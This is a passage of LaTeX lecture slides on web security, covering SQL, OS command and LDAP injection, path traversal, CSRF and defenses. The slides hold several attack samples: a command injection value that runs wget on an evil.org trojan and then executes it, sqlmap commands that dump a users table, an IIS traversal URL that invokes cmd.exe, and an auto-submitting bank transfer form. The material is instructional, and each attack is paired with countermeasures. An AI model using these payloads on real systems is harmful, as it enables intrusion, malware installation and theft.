+\draw[->, orange, thick] (param) -- node[arrow label, below, sloped] {\circled{2} Data (values)} (engine);
+
+\node[below=0.5cm of engine, font=\scriptsize, text width=4cm, align=center] {The engine \alert{distinguishes} code from data $\rightarrow$ injection impossible};
+\end{tikzpicture}
+\end{center}
+
+\begin{block}{Available in all languages}
+\begin{itemize}
+\item \textbf{PHP}: PDO, MySQLi
+\item \textbf{Python}: sqlite3, psycopg2, SQLAlchemy
+\item \textbf{Java}: PreparedStatement (JDBC)
+\item \textbf{Node.js}: parameterized queries (pg, mysql2)
+\end{itemize}
+\end{block}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Countermeasures -- Other Best Practices}
+
+\begin{itemize}
+\item \alert{ORM} (Object-Relational Mapping): Doctrine, Eloquent, SQLAlchemy, Hibernate automatically generate parameterized queries.
+
+\item \alert{Input validation}: verify the expected format \textbf{before} any use (email, number, max length).
+
+\item \alert{Principle of least privilege}: the application's SQL account should only have strictly necessary permissions.
+\begin{center}
+\texttt{GRANT SELECT, INSERT ON app\_db.* TO 'webapp'@'localhost'}
+\end{center}
+
+\item \alert{WAF} (Web Application Firewall): filters suspicious requests upstream (additional layer, not a standalone solution).
+
+\item \alert{Error messages}: \textbf{never} display SQL errors in production. Use generic error pages.
+\end{itemize}
+\end{frame}
+
+
+\subsection{SQL Testing Tools}
+
+\begin{frame}[fragile]
+\frametitle{SQL Injection Testing Tools}
+
+\begin{description}
+\item[\textbf{sqlmap}] Open source SQL injection automation tool. Automatically detects and exploits vulnerabilities.
+\begin{lstlisting}[basicstyle=\ttfamily\tiny,frame=single]
+sqlmap -u "http://site.com/page?id=1" --dbs
+sqlmap -u "http://site.com/page?id=1" -D mydb --tables
+sqlmap -u "http://site.com/page?id=1" -D mydb -T users --dump
+\end{lstlisting}
+
+\item[\textbf{Burp Suite}] HTTP proxy that intercepts and modifies requests. The \texttt{Repeater} module facilitates manual injection testing.
+
+\item[\textbf{OWASP ZAP}] Free, open source web vulnerability scanner. Automatic SQL injection detection.
+\end{description}
+
+\emptyline
+\begin{alertblock}{Reminder}
+Only use these tools in an \textbf{authorized} context: mandated penetration tests, lab environments, CTFs.
+\end{alertblock}
+\end{frame}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SECTION 4: Other Injection Types
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{Other Injection Types}
+
+
+\subsection{OS Command Injection}
+
+\begin{frame}[fragile]
+\frametitle{OS Command Injection}
+
+When a system command partially involves user input, an attacker can inject arbitrary instructions.
+\begin{lstlisting}[language=PHP,title={\texttt{Vulnerable PHP code}}]
+<?php
+$email_subject = "mail subject";
+if (isset($_GET['email']))
+  system("mail " . $_GET['email'] .
+    " -s '" . $email_subject .
+    "' < /tmp/email_body", $return_val);
+?>
+\end{lstlisting}
+This corresponds to the command:
+\begin{center}
+\texttt{mail [email-address] -s 'a subject' < /tmp/email\_body}
+\end{center}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Command Injection -- Attack}
+
+The behavior of the \texttt{mail} command can be modified with a deliberately malformed address.
+
+If \texttt{\$\_GET['email']} equals:
+\begin{center}
+\texttt{-{}-help; wget http://evil.org/trojan; ./trojan \#}
+\end{center}
+
+\begin{itemize}
+\item \texttt{-{}-help} displays the help page for the \texttt{mail} command.
+\item The \texttt{;} separates commands in the shell.
+\item \texttt{wget} downloads a malicious binary file.
+\item This file is then executed.
+\item With \texttt{\#}, the rest of the command is commented out.
+\end{itemize}
+
+\emptyline
+\alert{Countermeasure}: never pass user input directly to \texttt{system()}, \texttt{exec()}, or \texttt{shell\_exec()}. Use \texttt{escapeshellarg()} in PHP.
+\end{frame}
+
+
+\subsection{LDAP Injection}
+
+\begin{frame}[fragile]
+\frametitle{LDAP Injection}
+
+\begin{itemize}
+\item LDAP injection attacks allow users to access private information in a directory.
+\item The LDAP protocol (\textit{Lightweight Directory Access Protocol}) manages and stores network resources and users.
+\item LDAP is commonly used to manage access to computers and other resources.
+\end{itemize}
+
+\emptyline
+The following LDAP query displays the name and phone number for a given identifier:
+\begin{verbatim}
+http://intranet/ldap_query?user=rgc
+\end{verbatim}
+This generates the filter:
+\begin{verbatim}
+filter = (uid=rgc)
+attributes = cn, telephoneNumber
+\end{verbatim}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{LDAP Filter}
+
+More complex filters can be built using boolean operators: OR ($|$), AND ($\&$), on various attributes:
+\begin{center}
+\texttt{cn, dn, sn, objectClass, telephoneNumber, manager, ...}
+\end{center}
+
+For example:
+\begin{verbatim}
+filter = (&(objectClass=person)(cn=Rich*)
+           (|(telephoneNumber=40*)
+             (telephoneNumber=415*)))
+\end{verbatim}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Arbitrary LDAP Query Injection}
+Consider the HTTP request:
+\begin{verbatim}
+http://intranet/ldap_query?user=rgc
+\end{verbatim}
+which generates the filter \texttt{(uid=rgc)}.
+
+\emptyline
+The query is hijacked by crafting a valid LDAP filter:
+\begin{small}
+\begin{verbatim}
+http://intranet/ldap_query?user=*)(|(telephone=415-555-1212)
+\end{verbatim}
+\end{small}
+This request produces the filter:
+\begin{verbatim}
+(uid=*)(|(telephone=415-555-1212))
+\end{verbatim}
+
+\alert{Countermeasure}: validate inputs and escape special LDAP characters: \texttt{(}, \texttt{)}, \texttt{*}, \texttt{\textbackslash}, \texttt{NUL}.
+\end{frame}
+
+
+\subsection{Path Traversal}
+
+\begin{frame}
+\frametitle{Path Traversal (Directory Traversal)}
+
+\begin{itemize}
+\item A web server provides access to specific directories within a file tree.
+\item These directories are organized in a hierarchy from a root directory.
+\item A well-designed web server must \alert{never} allow access to files located above this root.
+\item Nowadays, many devices and software come with a built-in web server for remote management.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Path Traversal -- Examples}
+
+\begin{itemize}
+\item \textbf{Compaq Server Management Agent} (v4.0): it was possible to insert \texttt{../..} in a URL to navigate above the root directory.
+\begin{center}\begin{scriptsize}
+\texttt{http://my.server.com:2301/../../interesting/document.txt}
+\end{scriptsize}\end{center}
+
+\item \textbf{Microsoft IIS}: arbitrary programs could be executed using special encoding. The \texttt{../..} sequence was encoded as \texttt{..\%c0\%af..}
+\begin{center}\begin{scriptsize}
+\texttt{http://a.b.com/scripts/..\%c0\%af../winnt/system32/cmd.exe?/C+dir}
+\end{scriptsize}\end{center}
+
+\item The \texttt{scripts} prefix tricked the server into thinking the document was a script to be executed.
+\end{itemize}
+
+\emptyline
+\alert{Countermeasure}: normalize paths, forbid \texttt{..} sequences, use a whitelist of accessible files.
+\end{frame}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SECTION 5: Cross-Site Request Forgery (CSRF)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{Cross-Site Request Forgery (CSRF)}
+
+\begin{frame}
+\frametitle{CSRF -- Principle}
+
+\begin{itemize}
+\item CSRF (\textit{Cross-Site Request Forgery}) forces an authenticated user to \alert{execute unwanted actions} on a site where they are logged in.
+\item The attacker exploits the fact that the browser automatically sends session cookies with every request to the target site.
+\item Unlike XSS (which exploits the user's trust in the site), CSRF exploits the \alert{site's trust in the user's browser}.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{CSRF -- Attack Example}
+
+The attacker creates a malicious web page containing a hidden form:
+
+\begin{lstlisting}[language=HTML,title={\texttt{Malicious page}}]
+<html><body>
+<h1>You have won a prize!</h1>
+<!-- Hidden form, automatically submitted -->
+<form action="http://bank.com/transfer"
+      method="POST" id="f">
+  <input type="hidden" name="to" value="attacker"/>
+  <input type="hidden" name="amount" value="1000"/>
+</form>
+<script>document.getElementById('f').submit();</script>
+</body></html>
+\end{lstlisting}
+
+If the victim is logged into \texttt{bank.com}, the transfer will be executed using their session.
+\end{frame}
+
+
+\begin{frame}
+\frametitle{CSRF -- Countermeasures}
+
+\begin{itemize}
+\item \alert{CSRF tokens}: the server generates a unique token per form/session. The form must include this token to be accepted. A third-party site cannot know this token.
+\item \alert{\texttt{Origin}/\texttt{Referer} header verification}: the server verifies that the request originates from its own domain.
+\item \alert{\texttt{SameSite} cookies}: cookie attribute that prevents sending cookies on cross-site requests.
+\begin{center}
+\texttt{Set-Cookie: session=abc123; SameSite=Strict}
+\end{center}
+\item \alert{User confirmation}: require password re-entry or CAPTCHA for sensitive actions.
+\end{itemize}
+\end{frame}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SECTION 6: Best Practices and Defenses
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{Best Practices and Defenses}
+
+\begin{frame}
+\frametitle{Input Validation and Sanitization}
+
+\begin{itemize}
+\item \alert{Never trust user input}: everything from the client (forms, URLs, cookies, HTTP headers) must be validated server-side.
+\item \textbf{Validation}: check that data conforms to the expected format (regex for email, maximum length, numeric type, etc.).
+\item \textbf{Sanitization}: remove or escape dangerous characters before use.
+\item \textbf{Output encoding}: adapt encoding to the context (HTML, JavaScript, SQL, URL, CSS).
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Principle of Least Privilege}
+
+\begin{itemize}
+\item Each system component should only have the \alert{strictly necessary permissions} for its operation.
+\item \textbf{Database}: the application's SQL account should not have \texttt{DROP}, \texttt{CREATE}, or \texttt{GRANT} permissions.
+\item \textbf{File system}: the web server should not be able to write to its own directories.
+\item \textbf{Network}: limit outbound connections from the server (prevents data exfiltration).
+\item In case of compromise, damage is \alert{limited} to the scope of granted permissions.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{HTTP Security Headers}
+
+HTTP headers allow reinforcing client-side security:
+
+\begin{small}
+\begin{tabular}{|l|p{6cm}|}
+\hline
+\textbf{Header} & \textbf{Purpose} \\
+\hline
+\texttt{Content-Security-Policy} & Restricts allowed sources for scripts, styles, images \\
+\hline
+\texttt{X-Frame-Options} & Prevents page inclusion in an \texttt{iframe} (anti-clickjacking) \\
+\hline
+\texttt{X-Content-Type-Options} & Prevents browser MIME type sniffing \\
+\hline
+\texttt{Strict-Transport-Security} & Forces HTTPS usage \\
+\hline
+\texttt{X-XSS-Protection} & Enables the browser's built-in XSS filter \\
+\hline
+\end{tabular}
+\end{small}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Secure Frameworks and Libraries}
+
+\begin{itemize}
+\item Modern frameworks include built-in protections:
+\begin{itemize}
+\item \textbf{Laravel/Symfony} (PHP): automatic template escaping, CSRF tokens, Eloquent/Doctrine ORM.
+\item \textbf{Django} (Python): automatic escaping, CSRF protection, built-in ORM.
+\item \textbf{Spring} (Java): CSRF protection, input validation, Spring Security.
+\end{itemize}
+\item \alert{Use the framework's built-in protections} rather than reinventing your own security mechanisms.
+\item Keep dependencies \alert{up to date} to benefit from security patches.
+\end{itemize}
+\end{frame}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SECTION 7: Conclusion
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{Conclusion}
+
+\begin{frame}
+\frametitle{Key Takeaways}
+
+\begin{itemize}
+\item The major risks come from \alert{unvalidated user input}.
+\item To reduce risks:
+\begin{itemize}
+\item systematically validate and sanitize inputs,
+\item use prepared statements for database access,
+\item escape output according to context (HTML, JS, SQL),
+\item apply the principle of least privilege,
+\item use HTTP security headers.
+\end{itemize}
+\item OWASP provides reference guides and tools for securing web applications.
+\item Security is an \alert{ongoing process}: regular audits, updates, and vulnerability monitoring.
+\end{itemize}
+\end{frame}
+
+\end{document}
